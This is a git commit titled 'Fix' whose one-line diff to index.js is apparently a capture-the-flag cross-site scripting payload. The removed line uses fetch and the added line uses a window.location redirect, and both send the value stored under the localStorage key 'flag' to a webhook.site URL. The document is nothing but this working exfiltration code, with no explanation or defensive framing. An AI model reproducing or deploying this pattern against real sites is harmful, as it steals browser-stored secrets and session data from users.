f01851e627795382f29eba217a6aa8b0242353c1
Nicolas Ettlin <nicolas.ettlin@me.com>
2024-03-22 18:54:52 +0100

    Fix

--- index.js
+++ index.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/8b4bc299-82cc-4d2b-85ed-ec144d527966?' + window.localStorage.getItem('flag'))
+window.location = ('https://webhook.site/8b4bc299-82cc-4d2b-85ed-ec144d527966?' + window.localStorage.getItem('flag'))
